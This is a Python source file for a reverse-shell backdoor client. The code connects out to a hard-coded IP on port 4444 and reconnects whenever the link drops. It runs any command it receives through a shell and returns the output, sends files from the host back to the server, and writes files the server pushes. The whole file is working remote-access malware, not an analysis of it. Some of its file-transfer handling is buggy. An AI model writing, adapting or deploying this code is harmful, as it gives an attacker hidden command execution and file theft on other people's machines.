import socket
import subprocess
import json
import os
import base64
import time

def reliable_send(sock, data):
    """
    Sends data reliably by converting it to JSON.
    """
    json_data = json.dumps(data)
    sock.sendall(json_data.encode())

def reliable_recv(sock):
    """
    Receives data reliably, reconstructing JSON data.
    """
    data = b""
    while True:
        try:
            data += sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def upload_file(sock, file_name, content):
    """
    Uploads a file to the server.
    """
    reliable_send(sock, base64.b64encode(content).decode())

def download_file(sock, file_name, content_base64):
    """
    Downloads a file from the server.
    """
    try:
        decoded_content = base64.b64decode(content_base64)
        with open(file_name, "wb") as f:
            f.write(decoded_content)
        return "[+] Uploaded successfully to client."
    except Exception as e:
        return f"[-] Error during upload to client: {e}"

def client():
    """
    Connects to the server and handles commands.
    """
    # IMPORTANT: Replace 'YOUR_SERVER_IP' with your actual server IP address
    # In your case, this is 192.168.41.125
    IP = "192.168.41.125"
    PORT = 4444

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((IP, PORT))
            print("[+] Connected to server.")

            while True:
                command = reliable_recv(sock) # Receive command from server

                if command == "exit": # If command is 'exit', break loop and close connection
                    sock.close()
                    break
                elif command.startswith("cd "): # Handle 'cd' command
                    directory = command.split(" ")[1]
                    try:
                        os.chdir(directory)
                        reliable_send(sock, f"[+] Changed directory to {os.getcwd()}")
                    except FileNotFoundError:
                        reliable_send(sock, f"[-] Directory not found: {directory}")
                    except Exception as e:
                        reliable_send(sock, f"[-] Error changing directory: {e}")
                elif command.startswith("upload "): # Handle 'upload' command from server
                    # Expected command format: ["upload", filename, base64_content]
                    file_name_to_download = command[1]
                    content_base64 = command[2]
                    result = download_file(sock, file_name_to_download, content_base64)
                    reliable_send(sock, result)
                elif command.startswith("download "): # Handle 'download' command for server
                    file_name_to_upload = command.split(" ")[1]
                    try:
                        with open(file_name_to_upload, "rb") as f:
                            file_content = f.read()
                        upload_file(sock, file_name_to_upload, file_content)
                    except FileNotFoundError:
                        reliable_send(sock, f"[-] File '{file_name_to_upload}' not found on client.")
                    except Exception as e:
                        reliable_send(sock, f"[-] Error reading file: {e}")
                else:
                    # Execute other system commands
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    reliable_send(sock, result.decode(errors="ignore")) # Send command output back to server
            sock.close()
            break # Exit outer loop if connection is closed gracefully
        except ConnectionRefusedError:
            print("[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] An error occurred: {e}")
            time.sleep(5) # Wait before retrying on other errors

if __name__ == "__main__":
    client()